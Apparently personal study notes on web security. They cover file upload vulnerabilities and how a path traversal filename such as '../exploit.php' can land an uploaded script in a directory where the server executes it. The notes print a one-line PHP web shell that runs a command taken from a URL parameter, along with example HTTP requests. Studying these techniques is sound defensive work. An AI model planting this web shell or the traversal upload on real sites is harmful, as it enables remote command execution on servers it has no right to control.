While it's clearly better to prevent dangerous filetypes to be uploaded in the first place, the second line of defense is to stop the server from executing any scripts that slip through the first line of filtering.

As a precaution, servers generally only run scripts whose MIME type have been whitelisted. Otherwise, they may just return some kind of an error message, or in some cases, serve the contents of the file in plain text instead:
```http
GET /static/exploit.php?command=id HTTP/1.1
Host: normal-website.com
```
```http
HTTP/1.1 200 OK
Content-Type: text/plain
Content-Length: 39

<?php echo system($_GET['command']); ?>
```
While this prevent a web shell from being executed. This kind of configuration often differs between directories. A directory where user-supplied files are uploaded will likely have more stricter controls than other directories. If an attacker can exploit a [path traversal vulnerability](obsidian://open?vault=security-notes&file=Offensive%20Security%2FWeb%20Application%20Security%2FServer-side%20Vulnerabilities%2FPath%20Traversal%2FIntroduction), they may still be able to upload malicious files and the server executing it.
1. Intercept the HTTP request and send it to Burp Repeater
2. Modify the request body to include a path traversal sequence:
```http
POST /images HTTP/1.1
Host: normal-website.com
Content-Length: 12345
Content-Type: multipart/form-data; boundary=---------------------------012345678901234567890123456

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="image"; filename="../exploit.php"
Content-Type: text/x-php

[...binary content of example.jpg...]

---------------------------012345678901234567890123456
Content-Disposition: form-data; name="description"

This is an interesting description of my image.
```
